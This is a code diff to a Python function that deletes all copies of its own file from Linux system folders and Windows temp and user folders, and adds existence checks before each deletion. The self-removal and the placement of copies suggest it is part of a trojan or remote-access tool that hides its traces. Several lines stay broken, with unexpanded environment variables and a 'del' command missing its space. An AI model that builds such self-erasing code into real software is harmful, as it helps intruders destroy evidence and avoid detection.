@@ -65,10 +65,14 @@ def self_delete():
 			Delete all copies of this file from the Linux file
 			system.
 			'''
-			run(['rm', '/tmp/' + FILENAME]) # Attempt to remove files from Linux file system.
-			run(['rm', '/etc/' + FILENAME]) # ^
-			run(['rm', '/tmp/' + FILENAME]) # ^
-			run(['rm', fullpath]) # ^
+			if os.path.isfile('/tmp/' + FILENAME):
+				run(['rm', '/tmp/' + FILENAME]) # Attempt to remove files from Linux file system.
+			if os.path.isfile('/etc/' + FILENAME):
+				run(['rm', '/etc/' + FILENAME]) # ^
+			if os.path.isfile('/var/' + FILENAME):
+				run(['rm', '/var/' + FILENAME]) # ^
+			if os.path.isfile(fullpath):
+				run(['rm', fullpath]) # ^
 		except:
 			return r"Couldnt remove all files..." # Return this if deletion operation fails.
 		return r"Deleted all files..." # Returns this if deletion operation is successful.
@@ -78,10 +82,14 @@ def self_delete():
 			Delete all copies of this file from the Windows file
 			system.
 			'''
-			run([r'del %temp%\\' + FILENAME], shell=True) # Attempt to remove files from Windows file system.
-			run([r'del C:\Users\%username%\\' + FILENAME], shell=True) # ^
-			run([r'del C:\Users\%username%\AppData\\' + FILENAME], shell=True) # ^
-			run(r'del', fullpath, shell=True) # ^
+			if os.path.isfile('%temp%\\' + FILENAME):
+				run([r'del %temp%\\' + FILENAME], shell=True) # Attempt to remove files from Windows file system.
+			if os.path.isfile('C:\Users\%username%\\' + FILENAME):
+				run([r'del C:\Users\%username%\\' + FILENAME], shell=True) # ^
+			if os.path.isfile('C:\Users\%username%\AppData\\' + FILENAME):
+				run([r'del C:\Users\%username%\AppData\\' + FILENAME], shell=True) # ^
+			if os.path.isfile(fullpath):
+				run(r'del' + fullpath, shell=True) # ^
 		except:
 			return r"  Couldn't remove all files..." # Return this if deletion operation fails.
 		return r'  Deleted all files...' # Returns this if deletion operation is successful.
